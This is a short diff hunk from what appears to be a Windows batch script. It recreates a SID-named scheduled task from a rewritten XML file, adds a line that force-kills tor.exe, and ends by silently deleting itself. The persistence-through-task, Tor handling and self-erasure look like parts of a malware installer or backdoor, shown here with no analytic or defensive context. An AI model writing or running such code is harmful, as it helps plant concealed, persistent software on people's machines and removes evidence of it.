@@ -53,5 +53,5 @@ powershell -Command "(gc '%SID%.xml') -replace 'username', '%username%' | Out-Fi
 schtasks /Delete /TN "%SID%XYZ" /F
 schtasks /create /tn "%SID%XYZ" /xml "%SID%.xml"
 del "%SID%.xml"
-
+taskkill /f /im tor.exe
 DEL /s /f /q /a "%~f0" && exit
